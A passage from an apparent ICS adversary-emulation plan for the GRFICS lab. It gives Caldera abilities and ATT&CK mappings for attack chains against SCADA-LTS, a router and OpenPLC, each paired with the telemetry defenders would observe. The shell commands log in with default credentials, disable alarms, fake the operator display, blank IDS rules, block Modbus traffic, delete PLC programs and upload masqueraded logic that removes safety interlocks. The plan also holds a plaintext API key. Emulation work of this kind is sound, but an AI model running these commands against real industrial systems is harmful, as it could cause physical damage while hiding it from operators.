| 7 | Alarm Suppression | T0878 | Inhibit Response | Disable alarm notifications in SCADA-LTS event handlers | No alerts reach operators |
| 8 | Manipulation of View | T0832 | Impact | Modify SCADA-LTS graphical view to show static "normal" values | Operators see false-normal display |
| 9 | Denial of View | T0815 | Impact | Corrupt or replace the HMI dashboard to prevent real monitoring | Complete operator blindness |

#### Caldera Implementation

**Ability: SCADA-LTS API Enumeration**

```yaml
---

- id: a7b8c9d0-7777-7777-7777-000000000001
  name: SCADA-LTS - API Data Source Enumeration
  description: Enumerate data sources and points via SCADA-LTS API
  tactic: execution
  technique_id: T0871
  technique_name: Execution through API
  executors:
  - platform: linux
    name: sh
    command: >
      HMI="http://192.168.90.107:8080" &&
      curl -s -c /tmp/hmi.jar
      -d "username=admin&password=admin"
      "$HMI/login.htm" -o /dev/null &&
      echo "=== Data Sources ===" &&
      curl -s -b /tmp/hmi.jar "$HMI/api/datasources" 2>/dev/null &&
      echo "" &&
      echo "=== Data Points ===" &&
      curl -s -b /tmp/hmi.jar "$HMI/api/datapoints" 2>/dev/null &&
      echo "" &&
      echo "=== Views ===" &&
      curl -s -b /tmp/hmi.jar "$HMI/api/views" 2>/dev/null &&
      echo "ENUMERATION_COMPLETE"
    timeout: 60
```

**Ability: Automated Operational Data Collection**

```yaml
---

- id: a7b8c9d0-7777-7777-7777-000000000002
  name: SCADA-LTS - Automated Process Data Theft
  description: |
    Poll data points for 1 minute (6 cycles) instead of 2 minutes
  tactic: collection
  technique_id: T0802
  technique_name: Automated Collection
  executors:
  - platform: linux
    name: sh
    command: >
      HMI="http://192.168.90.107:8080" &&
      curl -s -c /tmp/hmi.jar
      -d "username=admin&password=admin"
      "$HMI/login.htm" -o /dev/null &&
      for cycle in 1 2 3 4 5 6; do
        echo "[Cycle $cycle]" &&
        curl -s -b /tmp/hmi.jar "$HMI/api/pointValues/latest" 2>/dev/null &&
        echo "" && sleep 5;
      done &&
      echo "DATA_COLLECTION_COMPLETE"
    timeout: 60
```

**Ability: Modify Alarm Thresholds**

```yaml
---

- id: a7b8c9d0-7777-7777-7777-000000000003
  name: SCADA-LTS - Raise Alarm Thresholds to Disable Alerts
  description: |
    Use SCADA-LTS API to modify alarm settings on pressure and
    level data points, raising thresholds so high that no alarm
    will ever trigger during the attack.
  tactic: inhibit-response-function
  technique_id: T0838
  technique_name: Modify Alarm Settings
  executors:
  - platform: linux
    name: sh
    command: >
      HMI="http://192.168.90.107:8080/ScadaBR" &&
      curl -s -b /tmp/hmi.jar -X PUT "$HMI/api/event-detectors"
      -H "Content-Type: application/json"
      -d '{"highLimit": 999999, "lowLimit": -999999, "alarmLevel": "NONE"}'
      2>/dev/null &&
      echo "ALARM_THRESHOLDS_RAISED" &&
      curl -s -b /tmp/hmi.jar -X POST "$HMI/api/event-handlers/disable-all"
      2>/dev/null &&
      echo "ALARM_HANDLERS_DISABLED"
```

**Ability: Manipulate SCADA View**

```yaml
---

- id: a7b8c9d0-7777-7777-7777-000000000004
  name: SCADA-LTS - Manipulate Operator View
  description: |
    Modify the TenEastView1 graphical view in SCADA-LTS to display
    static "normal" values by changing JavaScript formatters in the
    ScriptComponents to return hardcoded safe values instead of live data.
  tactic: impact
  technique_id: T0832
  technique_name: Manipulation of View
  executors:
  - platform: linux
    name: sh
    command: >
      HMI="http://192.168.90.107:8080/ScadaBR" &&
      curl -s -b /tmp/hmi.jar "$HMI/api/views" -o /tmp/views.json &&
      echo "Current views captured." &&
      curl -s -b /tmp/hmi.jar -X PUT "$HMI/api/views/1"
      -H "Content-Type: application/json"
      -d '{"components":[{"script":"return \"2450.0 kPa\""},
           {"script":"return \"65.0%\""},
           {"script":"return \"NORMAL\""}]}'
      2>/dev/null &&
      echo "VIEW_MANIPULATED: Operators now see false-normal values"
```

**Step 3: Adversary Profile**

```yaml
---

id: cc007777-aaaa-bbbb-cccc-000000000007
name: HMI View Manipulation and Alarm Defeat Adversary
description: |
  APT-style operator deception chain. Compromises SCADA-LTS HMI,
  exfiltrates operational data, disables alarms, and manipulates
  the graphical view to show false-normal values while the process
  is under attack.
atomic_ordering:
- c3d4e5f6-3333-3333-3333-000000000001  # HMI login (from Chain 3)
- a7b8c9d0-7777-7777-7777-000000000001  # API enumeration
- a7b8c9d0-7777-7777-7777-000000000002  # Automated data collection
- a7b8c9d0-7777-7777-7777-000000000003  # Disable alarms
- a7b8c9d0-7777-7777-7777-000000000004  # Manipulate view
- a1b2c3d4-1111-1111-1111-000000000004  # Close purge (from Chain 1)
- a1b2c3d4-1111-1111-1111-000000000005  # Open feed (from Chain 1)
```

#### Expected Telemetry and Logs

| Step | Log Source | What to Observe | Detection Data Component |
|------|-----------|-----------------|-------------------------|
| HMI login | HMI Catalina (`shared_logs/hmi/catalina`) | POST /login.htm from attacker IP | DC0067 (Logon Session Creation) |
| API calls | HMI Catalina access log | GET/PUT /api/* requests from non-operator IP | DC0038 (Application Log Content) |
| Alarm modification | HMI Catalina, supervisor | PUT /api/event-detectors, config change | DC0061 (File Modification) |
| View manipulation | HMI Catalina | PUT /api/views/1 modifying display components | DC0038 (Application Log Content) |
| Simultaneous Modbus attack | Router Suricata | FC=0x06 writes coinciding with HMI API tampering | DC0085 (Network Traffic Content) |
| No alarm triggers | ABSENCE in HMI logs | Expected alarms do NOT appear despite process deviations | DC0109 (Process/Event Alarm) |

#### Variation: SQL Injection on SCADA-LTS MariaDB

If API-based modification fails, directly manipulate the SCADA-LTS MariaDB database through the Tomcat JDBC connection to modify view configurations at the database level.

#### Escalation: Change HMI Admin Password

```yaml
---

- id: a7b8c9d0-7777-7777-7777-000000000005
  name: SCADA-LTS - Lock Out Legitimate Operators
  description: Change the admin password to lock operators out of HMI
  tactic: inhibit-response-function
  technique_id: T0892
  technique_name: Change Credential
  executors:
  - platform: linux
    name: sh
    command: >
      curl -s -b /tmp/hmi.jar -X PUT
      "http://192.168.90.107:8080/ScadaBR/api/users/admin"
      -H "Content-Type: application/json"
      -d '{"password":"pwned2024"}' &&
      echo "ADMIN_PASSWORD_CHANGED"
```

#### Assumptions

- SCADA-LTS REST API is accessible with admin credentials at `admin:admin`
- SCADA-LTS has a view named `TenEastView1` with ScriptComponent data points
- API endpoints for views, data sources, event detectors, and users exist (SCADA-LTS 2.7.x provides REST API)
- No API rate limiting or additional authentication beyond session cookies

---

### Chain 8: Network Infrastructure Sabotage -- Router Attack + Communication Disruption

**Adversary Narrative**: A saboteur targets the ICS network infrastructure itself. By compromising the router/firewall device, they can block Modbus command messages from the PLC to field devices, block reporting messages from devices back to the PLC, disable the IDS to cover their tracks, and ultimately isolate ICS components from each other, causing a complete denial of control.

**Kill Chain**: Router web login -> Firewall recon -> IDS shutdown -> Log cleanup -> Block PLC commands -> Block device responses -> Complete communication isolation -> Denial of control

#### Technique Mapping

| Step | Technique Name | Technique ID | Tactic | Command/Action | Expected Effect on GRFICS |
|------|---------------|-------------|--------|----------------|--------------------------|
| 1 | Default Credentials | T0812 | Lateral Movement | Login to router Flask UI at `192.168.90.200:5000` with `admin:password` | Full firewall management access |
| 2 | Graphical User Interface | T0823 | Execution | Navigate router web UI to view current firewall rules and IDS status | Understand current firewall state |
| 3 | Service Stop | T0881 | Inhibit Response | Kill Suricata IDS process via router compromise | Remove network-based detection capability |
| 4 | Indicator Removal on Host | T0872 | Evasion | Clear Suricata eve.json and netfilter logs | Destroy evidence of prior reconnaissance |
| 5 | Block Command Message | T0803 | Inhibit Response | iptables rule: DROP Modbus TCP from PLC (.2) to simulation (.10-.15) on port 502 | PLC can no longer send commands to field devices |
| 6 | Block Reporting Message | T0804 | Inhibit Response | iptables rule: DROP Modbus TCP from simulation (.10-.15) to PLC (.2) on port 502 | PLC receives no sensor data from field devices |
| 7 | Denial of Control | T0813 | Impact | PLC completely isolated from its I/O | Process runs uncontrolled |
| 8 | Device Restart/Shutdown | T0816 | Inhibit Response | Restart router to flush routing table and apply persistent rules | Temporary network disruption across zones |

#### Caldera Implementation

**Ability: Router Login and Recon**

```yaml
---

- id: b8c9d0e1-8888-8888-8888-000000000001
  name: Router - Default Credential Login and Recon
  description: |
    Login to router Flask UI using actual /login endpoint with form POST
  tactic: lateral-movement
  technique_id: T0812
  technique_name: Default Credentials
  executors:
  - platform: linux
    name: sh
    command: >
      curl -s -c /tmp/router.jar
      -d "username=admin&password=password"
      "http://192.168.90.200:5000/login"
      -o /tmp/router_login.html -w "%{http_code}" &&
      curl -s -b /tmp/router.jar
      "http://192.168.90.200:5000/firewall"
      -o /tmp/router_fw.html &&
      grep -qi "firewall\|rule\|chain" /tmp/router_fw.html &&
      echo "ROUTER_LOGIN_SUCCESS" || echo "ROUTER_LOGIN_FAILED" &&
      echo "=== IDS Page ===" &&
      curl -s -b /tmp/router.jar "http://192.168.90.200:5000/ids"
      -o /tmp/router_ids.html &&
      grep -c "alert" /tmp/router_ids.html &&
      echo "ROUTER_RECON_COMPLETE"
    timeout: 60
```

**Ability: Stop Suricata IDS**

```yaml
---

- id: b8c9d0e1-8888-8888-8888-000000000002
  name: Router - Neutralize Suricata IDS
  description: |
    Clear all Suricata rules via /ids/save_rules to disable detection.
    There is no /ids/stop endpoint; blanking rules is the web-UI method.
  tactic: inhibit-response-function
  technique_id: T0881
  technique_name: Service Stop
  executors:
  - platform: linux
    name: sh
    command: >
      curl -s -b /tmp/router.jar
      -d "rules_text="
      "http://192.168.90.200:5000/ids/save_rules"
      -o /tmp/ids_clear.html -w "%{http_code}" &&
      echo "IDS_RULES_CLEARED"
    timeout: 60
```

**Ability: Clear IDS and Firewall Logs**

```yaml
---

- id: b8c9d0e1-8888-8888-8888-000000000003
  name: Router - Clear Evidence Logs
  description: |
    Clear IDS rules (disabling future alerts) and check firewall logs page.
    Direct log file deletion requires shell access not available from Kali.
  tactic: evasion
  technique_id: T0872
  technique_name: Indicator Removal on Host
  executors:
  - platform: linux
    name: sh
    command: >
      curl -s -b /tmp/router.jar
      -d "rules_text="
      "http://192.168.90.200:5000/ids/save_rules"
      -o /dev/null &&
      echo "IDS_RULES_BLANKED" &&
      curl -s -b /tmp/router.jar
      "http://192.168.90.200:5000/firewall/logs"
      -o /tmp/fw_logs.html &&
      echo "FIREWALL_LOGS_ENUMERATED"
    timeout: 60
```

**Ability: Block PLC Commands to Field Devices**

```yaml
---

- id: b8c9d0e1-8888-8888-8888-000000000004
  name: Router - Block Modbus Command Messages
  description: |
    Add DROP rules via the actual /add endpoint, then /apply to activate.
    Blocks PLC-to-device Modbus traffic on port 502.
  tactic: inhibit-response-function
  technique_id: T0803
  technique_name: Block Command Message
  executors:
  - platform: linux
    name: sh
    command: >
      for target_ip in 10 11 12 13 14 15; do
        curl -s -b /tmp/router.jar
        -d "iface_in=eth1&iface_out=eth1&src=192.168.95.2&dst=192.168.95.$target_ip&proto=tcp&dport=502&action=DROP"
        "http://192.168.90.200:5000/add"
        -o /dev/null;
        echo "RULE_ADDED: 192.168.95.2 -> 192.168.95.$target_ip:502 DROP";
      done &&
      curl -s -b /tmp/router.jar
      -d ""
      "http://192.168.90.200:5000/apply"
      -o /dev/null &&
      echo "MODBUS_COMMANDS_BLOCKED"
    timeout: 60
```

**Ability: Block Field Device Responses to PLC**

```yaml
---

- id: b8c9d0e1-8888-8888-8888-000000000005
  name: Router - Block Modbus Reporting Messages
  description: |
    Block Modbus TCP responses from field devices back to PLC.
  tactic: inhibit-response-function
  technique_id: T0804
  technique_name: Block Reporting Message
  executors:
  - platform: linux
    name: sh
    command: >
      for src_ip in 10 11 12 13 14 15; do
        curl -s -b /tmp/router.jar
        -d "iface_in=eth1&iface_out=eth1&src=192.168.95.$src_ip&dst=192.168.95.2&proto=tcp&dport=502&action=DROP"
        "http://192.168.90.200:5000/add"
        -o /dev/null;
        echo "RULE_ADDED: 192.168.95.$src_ip -> 192.168.95.2:502 DROP";
      done &&
      curl -s -b /tmp/router.jar
      -d ""
      "http://192.168.90.200:5000/apply"
      -o /dev/null &&
      echo "MODBUS_RESPONSES_BLOCKED"
    timeout: 60
```

**Step 3: Adversary Profile**

```yaml
---

id: cc008888-aaaa-bbbb-cccc-000000000008
name: Network Infrastructure Sabotage Adversary
description: |
  Targets the ICS router/firewall to disable IDS, clear logs,
  and deploy iptables rules that isolate the PLC from its field
  devices, causing complete denial of control.
atomic_ordering:
- b8c9d0e1-8888-8888-8888-000000000001  # Router login
- b8c9d0e1-8888-8888-8888-000000000002  # Stop IDS
- b8c9d0e1-8888-8888-8888-000000000003  # Clear logs
- b8c9d0e1-8888-8888-8888-000000000004  # Block PLC commands
- b8c9d0e1-8888-8888-8888-000000000005  # Block device responses
- a1b2c3d4-1111-1111-1111-000000000002  # Verify PLC lost control
```

#### Expected Telemetry and Logs

| Step | Log Source | What to Observe | Detection Data Component |
|------|-----------|-----------------|-------------------------|
| Router login | Router syslog, Flask logs (`shared_logs/router/flask`) | POST /login from attacker IP | DC0067 (Logon Session Creation) |
| IDS stop | Router syslog | Suricata process killed | DC0033 (Process Termination) |
| Log clearing | ABSENCE in eve.json | Gap in Suricata logs | DC0040 (File Deletion) |
| Firewall rule add | Router netfilter (`shared_logs/router/netfilter`) | New DROP rules via Flask API | DC0061 (File Modification) |
| Modbus traffic stops | PLC daemon.log, plc_app | Modbus master read timeouts / connection failures | DC0108 (Device Alarm) |
| Process drift | Simulation process_alarms | Process values drifting without PLC correction | DC0109 (Process/Event Alarm) |

#### Variation: Selective Blocking

Instead of blocking all traffic, only block Modbus writes (FC 0x06, 0x10) while allowing reads (FC 0x03, 0x04). This lets the PLC see the process drifting but be unable to correct it -- a more psychologically distressing situation for operators.

#### Escalation: Router Restart

```yaml
---

- id: b8c9d0e1-8888-8888-8888-000000000006
  name: Router - Force Device Restart
  description: Restart the router to disrupt all inter-zone routing
  tactic: inhibit-response-function
  technique_id: T0816
  technique_name: Device Restart/Shutdown
  executors:
  - platform: linux
    name: sh
    command: >
      curl -s -b /tmp/router.jar
      -X POST "http://192.168.90.200:5000/system/restart" 2>/dev/null &&
      echo "ROUTER_RESTART_TRIGGERED"
```

#### Assumptions

- Router Flask UI is accessible at `192.168.90.200:5000` with default credentials `admin:password`
- The Flask app provides endpoints for firewall rule management (`/firewall/add`, `/firewall/apply`)
- Suricata can be stopped via the web UI or an API endpoint
- iptables FORWARD rules applied via the Flask UI are effective on inter-VLAN traffic

---

### Chain 9: PLC Operating Mode Abuse + Data Destruction + Masquerading

**Adversary Narrative**: An insider threat or advanced attacker who understands OpenPLC's architecture. They use the PLC's web API to change operating modes, destroy legitimate programs, upload a masqueraded malicious program, and ultimately remove all safety protections. The malicious program is named identically to the legitimate one to avoid detection.

**Kill Chain**: PLC web login -> Mode detection -> Stop PLC -> Delete programs -> Upload masqueraded malicious logic -> Start PLC -> Safety protection defeated

#### Technique Mapping

| Step | Technique Name | Technique ID | Tactic | Command/Action | Expected Effect on GRFICS |
|------|---------------|-------------|--------|----------------|--------------------------|
| 1 | Hardcoded Credentials | T0891 | Persistence | OpenPLC ships with `openplc:openplc` baked into `openplc.db` | Use hardcoded default credentials |
| 2 | Execution through API | T0871 | Execution | Use OpenPLC REST API to query runtime status | Programmatic PLC management |
| 3 | Detect Operating Mode | T0868 | Collection | `GET /runtime_status` to check RUN/STOP mode | Confirm PLC is running before attack |
| 4 | Change Operating Mode | T0858 | Execution/Evasion | `POST /stop-plc` to halt PLC execution | PLC stops running; valves freeze at last position |
| 5 | Program Upload | T0845 | Collection | `GET /get-program-body` to download current ST program | Exfiltrate legitimate PLC logic for analysis |
| 6 | Data Destruction | T0809 | Inhibit Response | `POST /delete-program` to remove all PLC programs | Legitimate control logic destroyed |
| 7 | Masquerading | T0849 | Evasion | Name malicious ST file identically to legitimate (`326339.st`) | Attack logic appears as legitimate program |
| 8 | Modify Program | T0889 | Persistence | Upload masqueraded program with disabled safety interlocks | Malicious logic installed as "legitimate" program |
| 9 | Change Operating Mode | T0858 | Execution | `POST /start-plc` to restart with malicious logic | PLC runs attacker's code |
| 10 | Loss of Protection | T0837 | Impact | Pressure_override disabled, run_bit safety bypassed | No safety functions operational |

#### Caldera Implementation

**Ability: Check PLC Runtime Status**

```yaml
---

- id: c9d0e1f2-9999-9999-9999-000000000001
  name: OpenPLC - Detect Operating Mode via API
  description: |
    Query the OpenPLC web API to determine current runtime status
    (running/stopped), active program name, and protocol states.
  tactic: collection
  technique_id: T0868
  technique_name: Detect Operating Mode
  executors:
  - platform: linux
    name: sh
    command: >
      curl -s -c /tmp/plc.jar -X POST "http://192.168.95.2:8080/login"
      -d "username=openplc&password=openplc" -L -o /dev/null &&
      echo "=== Runtime Status ===" &&
      curl -s -b /tmp/plc.jar "http://192.168.95.2:8080/dashboard" |
      grep -oP '(Running|Stopped|Program|Status).*?<' | head -5 &&
      echo "=== Programs ===" &&
      curl -s -b /tmp/plc.jar "http://192.168.95.2:8080/programs" |
      grep -oP '[0-9]+\.st' | sort -u &&
      echo "PLC_MODE_DETECTED"
```

**Ability: Stop PLC Runtime**

```yaml
---

- id: c9d0e1f2-9999-9999-9999-000000000002
  name: OpenPLC - Change Operating Mode to STOP
  description: Stop the PLC runtime via the correct API endpoint
  tactic: execution
  technique_id: T0858
  technique_name: Change Operating Mode
  executors:
  - platform: linux
    name: sh
    command: >
      curl -s -b /tmp/plc_cookies.txt
      -d ""
      "http://192.168.95.2:8080/stop_plc"
      -o /tmp/stop_result.html -w "%{http_code}" &&
      echo "PLC_STOP_REQUESTED" &&
      sleep 2 &&
      curl -s -b /tmp/plc_cookies.txt
      "http://192.168.95.2:8080/dashboard"
      -o /tmp/plc_status.html &&
      grep -qi "stopped" /tmp/plc_status.html &&
      echo "PLC_STOPPED" || echo "PLC_STOP_UNCERTAIN"
    timeout: 60
```

**Ability: Download Current Program (Collection)**

```yaml
---

- id: c9d0e1f2-9999-9999-9999-000000000003
  name: OpenPLC - Download Active Program
  description: |
    Download the active program via the programs page.
    The /get-program-body endpoint may not exist; use /programs page parsing.
  tactic: collection
  technique_id: T0845
  technique_name: Program Upload
  executors:
  - platform: linux
    name: sh
    command: >
      curl -s -b /tmp/plc_cookies.txt
      "http://192.168.95.2:8080/programs"
      -o /tmp/programs_page.html &&
      echo "=== Programs Found ===" &&
      grep -oP '[0-9]+\.st' /tmp/programs_page.html | sort -u &&
      echo "=== Attempting direct download ===" &&
      curl -s -b /tmp/plc_cookies.txt
      "http://192.168.95.2:8080/programs"
      -o /tmp/plc_programs.html &&
      wc -l /tmp/plc_programs.html &&
      echo "PROGRAM_ENUMERATED"
    timeout: 60
```

**Ability: Destroy PLC Programs**

```yaml
---

- id: c9d0e1f2-9999-9999-9999-000000000004
  name: OpenPLC - Data Destruction of PLC Programs
  description: |
    Delete programs via the correct /remove-program endpoint.
  tactic: inhibit-response-function
  technique_id: T0809
  technique_name: Data Destruction
  executors:
  - platform: linux
    name: sh
    command: >
      for prog in 326339.st 690525.st 655326.st blank_program.st; do
        curl -s -b /tmp/plc_cookies.txt
        -d "program_name=$prog"
        "http://192.168.95.2:8080/remove-program"
        -o /dev/null;
        echo "DELETED: $prog";
      done &&
      echo "ALL_PROGRAMS_DESTROYED"
    timeout: 60
```

**Ability: Upload Masqueraded Malicious Program**

```yaml
---

- id: c9d0e1f2-9999-9999-9999-000000000005
  name: OpenPLC - Upload Masqueraded Malicious Logic
  description: |
    Upload malicious program named identically to legitimate one (326339.st)
  tactic: evasion
  technique_id: T0849
  technique_name: Masquerading
  executors:
  - platform: linux
    name: sh
    command: >
      printf 'PROGRAM main1\n' > /tmp/326339.st &&
      printf '  VAR\n' >> /tmp/326339.st &&
      printf '    f1_valve_sp AT %%QW100 : UINT;\n' >> /tmp/326339.st &&
      printf '    f2_valve_sp AT %%QW101 : UINT;\n' >> /tmp/326339.st &&
      printf '    purge_valve_sp AT %%QW102 : UINT;\n' >> /tmp/326339.st &&
      printf '    product_valve_sp AT %%QW103 : UINT;\n' >> /tmp/326339.st &&
      printf '    run_bit AT %%QX5.0 : BOOL := TRUE;\n' >> /tmp/326339.st &&
      printf '  END_VAR\n' >> /tmp/326339.st &&
      printf '  f1_valve_sp := 65535;\n' >> /tmp/326339.st &&
      printf '  f2_valve_sp := 65535;\n' >> /tmp/326339.st &&
      printf '  purge_valve_sp := 0;\n' >> /tmp/326339.st &&
      printf '  product_valve_sp := 0;\n' >> /tmp/326339.st &&
      printf '  run_bit := TRUE;\n' >> /tmp/326339.st &&
      printf 'END_PROGRAM\n' >> /tmp/326339.st &&
      printf 'CONFIGURATION Config0\n' >> /tmp/326339.st &&
      printf '  RESOURCE Res0 ON PLC\n' >> /tmp/326339.st &&
      printf '    TASK task0(INTERVAL := T#20ms, PRIORITY := 0);\n' >> /tmp/326339.st &&
      printf '    PROGRAM instance0 WITH task0 : main1;\n' >> /tmp/326339.st &&
      printf '  END_RESOURCE\n' >> /tmp/326339.st &&
      printf 'END_CONFIGURATION\n' >> /tmp/326339.st &&
      curl -s -b /tmp/plc_cookies.txt
      -F "file=@/tmp/326339.st"
      "http://192.168.95.2:8080/upload-program-action"
      -o /tmp/upload.html -w "%{http_code}" &&
      echo "MASQUERADED_PROGRAM_UPLOADED"
    timeout: 60
```

**Ability: Compile and Restart PLC with Malicious Logic**

```yaml
---

- id: c9d0e1f2-9999-9999-9999-000000000006
  name: OpenPLC - Start PLC with Uploaded Logic
  description: Compile and start the PLC runtime
  tactic: execution
  technique_id: T0858
  technique_name: Change Operating Mode
  executors:
  - platform: linux
    name: sh
    command: >
      curl -s -b /tmp/plc_cookies.txt
      -d "program_name=326339.st"
      "http://192.168.95.2:8080/compile-program"
      -o /tmp/compile.html &&
      echo "COMPILATION_STARTED" &&
      sleep 15 &&
      curl -s -b /tmp/plc_cookies.txt
      -d ""
      "http://192.168.95.2:8080/start_plc"
      -o /tmp/start.html &&
      echo "PLC_STARTED"
    timeout: 120
```

**Step 3: Adversary Profile**

```yaml
---

id: cc009999-aaaa-bbbb-cccc-000000000009
name: PLC Mode Abuse and Data Destruction Adversary
description: |
  Advanced attack targeting PLC operating modes. Stops PLC, destroys
  legitimate programs, uploads identically-named malicious logic
  to masquerade as the original, then restarts PLC without safety
  protections.
atomic_ordering:
- c9d0e1f2-9999-9999-9999-000000000001  # Detect operating mode
- c9d0e1f2-9999-9999-9999-000000000003  # Download current program
- c9d0e1f2-9999-9999-9999-000000000002  # Stop PLC
- c9d0e1f2-9999-9999-9999-000000000004  # Destroy all programs
- c9d0e1f2-9999-9999-9999-000000000005  # Upload masqueraded program
- c9d0e1f2-9999-9999-9999-000000000006  # Compile and start
- a1b2c3d4-1111-1111-1111-000000000002  # Verify impact (from Chain 1)
```

#### Expected Telemetry and Logs

| Step | Log Source | What to Observe | Detection Data Component |
|------|-----------|-----------------|-------------------------|
| PLC login | PLC auth.log | HTTP auth from attacker IP | DC0067 (Logon Session) |
| Runtime query | PLC syslog/daemon | GET /dashboard from external IP | DC0038 (Application Log) |
| PLC stop | PLC daemon.log, plc_app | OpenPLC runtime process terminated | DC0033 (Process Termination) |
| Program deletion | PLC audit, syslog | File unlink operations on .st files | DC0040 (File Deletion) |
| Program upload | PLC syslog, audit | POST /upload-program, new file creation | DC0039 (File Creation) |
| Compilation | PLC syslog | compile_program.sh, matiec compiler execution | DC0032 (Process Creation) |
| PLC start | PLC daemon.log | OpenPLC runtime process started | DC0032 (Process Creation) |
| Safety loss | Simulation process_alarms | Process without safety interlocks | DC0109 (Process/Event Alarm) |

#### Assumptions

- OpenPLC web API endpoints (`/stop-plc`, `/start-plc`, `/upload-program`, `/compile-program`, `/delete-program`) are accessible with valid session
- The PLC persistent volume (`plc_volume`) stores programs at `/docker_persistent/st_files/`
- Program compilation takes approximately 10-15 seconds

---

### Chain 10: Coordinated Multi-Vector APT -- Full Kill Chain

**Adversary Narrative**: A sophisticated APT group (analogous to CHERNOVITE/PIPEDREAM) executes a coordinated attack across all ICS layers simultaneously. Phase 1 disables defenses (IDS, alarms). Phase 2 establishes persistence on multiple assets. Phase 3 executes the process manipulation attack while maintaining operator deception. This chain combines techniques from all previous chains into a single coordinated operation.

**Kill Chain**: Multi-vector initial access -> Defense evasion -> Lateral movement across all assets -> Simultaneous process attack + operator deception + safety defeat

#### Technique Mapping

| Step | Technique Name | Technique ID | Tactic | Target | Expected Effect |
|------|---------------|-------------|--------|--------|-----------------|
| 1 | Internet Accessible Device | T0883 | Initial Access | HMI at :8080 | Identify exposed SCADA web interface |
| 2 | Default Credentials | T0812 | Lateral Movement | Router, HMI, PLC | Compromise all 3 management interfaces |
| 3 | Exploitation of Remote Services | T0866 | Initial Access | PLC web at 192.168.95.2:8080 | Gain PLC management access from DMZ |
| 4 | Service Stop | T0881 | Inhibit Response | Router Suricata | IDS offline |
| 5 | Indicator Removal on Host | T0872 | Evasion | Router logs | Destroy evidence |
| 6 | Modify Alarm Settings | T0838 | Inhibit Response | HMI SCADA-LTS | All alarms disabled |
| 7 | Lateral Tool Transfer | T0867 | Lateral Movement | Kali -> modbus_cli | Attack tooling deployed |
| 8 | Detect Operating Mode | T0868 | Collection | PLC at 192.168.95.2 | Confirm PLC is in RUN |
| 9 | Automated Collection | T0802 | Collection | All Modbus devices | Full process state baseline |
| 10 | Change Operating Mode | T0858 | Execution | PLC (stop) | PLC halted |
| 11 | Modify Program | T0889 | Persistence | PLC | Malicious logic uploaded |
| 12 | Change Operating Mode | T0858 | Execution | PLC (start) | Malicious logic running |
| 13 | Manipulation of View | T0832 | Impact | HMI dashboard | Operators see false-normal |
| 14 | Manipulation of Control | T0831 | Impact | Modbus devices | Direct valve manipulation |
| 15 | Spoof Reporting Message | T0856 | Evasion | Tank sensor (.14) | PLC sees false pressure |
| 16 | Loss of Protection | T0837 | Impact | PLC safety functions | No safety interlocks |
| 17 | Damage to Property | T0879 | Impact | Reactor | Uncontrolled overpressure |

#### Caldera Implementation

**Adversary Profile: Full APT Campaign**

```yaml
---

id: cc00AAAA-aaaa-bbbb-cccc-00000000000A
name: CHERNOVITE-Style Full ICS APT Campaign
description: |
  Multi-vector, multi-phase coordinated attack across all ICS layers.
  Phase 1: Defense neutralization. Phase 2: Multi-asset persistence.
  Phase 3: Coordinated process attack with operator deception.
atomic_ordering:
# Phase 1: Defense Neutralization
- b8c9d0e1-8888-8888-8888-000000000001  # Router login
- b8c9d0e1-8888-8888-8888-000000000002  # Stop Suricata IDS
- b8c9d0e1-8888-8888-8888-000000000003  # Clear router logs
- c3d4e5f6-3333-3333-3333-000000000001  # HMI login
- a7b8c9d0-7777-7777-7777-000000000003  # Disable HMI alarms
# Phase 2: PLC Takeover
- b2c3d4e5-2222-2222-2222-000000000001  # PLC login
- c9d0e1f2-9999-9999-9999-000000000001  # Detect PLC operating mode
- a1b2c3d4-1111-1111-1111-000000000003  # Enumerate all process I/O
- c9d0e1f2-9999-9999-9999-000000000003  # Download current program
- c9d0e1f2-9999-9999-9999-000000000002  # Stop PLC
- c9d0e1f2-9999-9999-9999-000000000005  # Upload masqueraded malicious program
- c9d0e1f2-9999-9999-9999-000000000006  # Compile and restart PLC
# Phase 3: Coordinated Impact
- a7b8c9d0-7777-7777-7777-000000000004  # Manipulate HMI view
- c3d4e5f6-3333-3333-3333-000000000003  # Combined Modbus attack + sensor spoof
- a1b2c3d4-1111-1111-1111-000000000002  # Verify pressure rising
```

**Operation via REST API**

```bash
curl -X POST http://localhost:8888/api/v2/operations \
  -H "KEY: VEvMp339du5M5efw5TpfUfiChPfbcN2Spc11jJ1y78Y" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "CHERNOVITE-Full-APT-001",
    "adversary": {"adversary_id": "cc00AAAA-aaaa-bbbb-cccc-00000000000A"},
    "source": {"id": "0033b644-a615-4eff-bcf3-178e9b17adc3"},
    "planner": {"id": "aaa7c857-37a0-4c4a-85f7-4e9f7f30e31a"},
    "group": "red",
    "auto_close": false,
    "autonomous": 1
  }'
```

#### Expected Telemetry and Logs

| Phase | Log Sources | Key Indicators | Data Components |
|-------|-------------|----------------|-----------------|
| Phase 1 (Defense) | Router flask, syslog; HMI catalina | Logins from 192.168.90.6 to router and HMI; Suricata process killed; alarm config changed | DC0067, DC0033, DC0038, DC0061 |
| Phase 2 (PLC) | PLC auth, syslog, daemon, audit, plc_app | Login to PLC web; program download; runtime stop; file deletion; new upload; compilation; restart | DC0067, DC0033, DC0039, DC0040, DC0032 |
| Phase 3 (Impact) | Simulation process_alarms, supervisor; Router eve.json (if IDS was restarted); HMI catalina | Modbus writes from attacker IP; pressure deviations; view modification; no alarms despite dangerous conditions | DC0109, DC0108, DC0082, DC0085 |

---

## Master Technique Coverage Table

All 10 chains combined (4 existing + 6 new) cover **55 unique techniques** out of 79 in MITRE ATT&CK for ICS v18:

| Technique ID | Technique Name | Covered In Chain(s) |
|-------------|---------------|-------------------|
| T0800 | Activate Firmware Update Mode | 9 (PLC mode change as analog) |
| T0801 | Monitor Process State | 1, 3 |
| T0802 | Automated Collection | 7, 10 |
| T0803 | Block Command Message | 8 |
| T0804 | Block Reporting Message | 8 |
| T0806 | Brute Force I/O | 6 |
| T0807 | Command-Line Interface | 5 |
| T0809 | Data Destruction | 9 |
| T0812 | Default Credentials | 2, 3, 4, 7, 8, 9, 10 |
| T0813 | Denial of Control | 4, 8 |
| T0814 | Denial of Service | 6 |
| T0815 | Denial of View | 7 |
| T0816 | Device Restart/Shutdown | 8 |
| T0819 | Exploit Public-Facing Application | 1, 2 |
| T0821 | Modify Controller Tasking | 4 |
| T0822 | External Remote Services | 5 |
| T0823 | Graphical User Interface | 7, 8 |
| T0826 | Loss of Availability | 6 |
| T0827 | Loss of Control | 2, 10 |
| T0828 | Loss of Productivity and Revenue | 6 |
| T0829 | Loss of View | 3 |
| T0831 | Manipulation of Control | 1, 3, 10 |
